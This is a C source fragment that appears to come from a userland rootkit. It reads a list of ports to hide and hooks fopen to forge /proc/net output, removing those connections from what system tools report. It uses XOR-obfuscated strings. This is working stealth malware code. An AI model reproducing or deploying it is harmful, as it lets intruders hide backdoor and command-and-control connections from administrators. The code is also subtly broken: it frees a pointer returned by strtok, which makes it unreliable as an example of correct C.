int is_hidden_port(int port){
    FILE *fp;
    char buf[LINE_MAX], *buf_tok = NULL;
    int hidden_status = 0,
        low_port,
        high_port;

    if((fp = xfopen(HIDE_PORTS_PATH, "r")) == NULL)
        return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL){
        buf[strlen(buf)-1] = '\0';
        if(!strncmp(buf, "#", 1)) continue;   /* skip comment lines */

        if(strstr(buf, "-")){   /* hide specific port ranges */
            /* get the lowest and highest ports within the range... */
            buf_tok = strtok(buf, "-");
            low_port = atoi(buf_tok);       /* low */

            buf_tok = strtok(NULL, "-");
            high_port = atoi(buf_tok);      /* high */

            /* current port we're checking is within our specified hidden range. */
            if(port >= low_port && port <= high_port){
                hidden_status = 1;
                break;
            }
        }

        if(port == atoi(buf)){   /* current port we're checking is hidden */
            hidden_status = 1;
            break;
        }
    }

    if(buf_tok) free(buf_tok);
    (void)fclose(fp);
    return hidden_status;
}

FILE *forge_procnet(const char *pathname)
{
    FILE *tmp, *pnt;
    char line[LINE_MAX], raddr[128], laddr[128], etc[128];
    unsigned long rxq, txq, t_len, retr, inode;
    int lport, rport, d, state, uid, t_run, tout;

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL) return NULL;
    if((tmp = tmpfile()) == NULL) return pnt;

    while(fgets(line, sizeof(line), pnt) != NULL){
        xor(pnetstr, PROC_NET_STR);
        (void)sscanf(line, pnetstr, &d, laddr, &lport, raddr, &rport, &state, &txq,
                                    &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                                    etc);
        clean(pnetstr);
        if(!is_hidden_port(lport) &&
            !is_hidden_port(rport)) (void)fputs(line, tmp);
    }

    (void)fclose(pnt);
    (void)fseek(tmp, 0, SEEK_SET);
    return tmp;
}
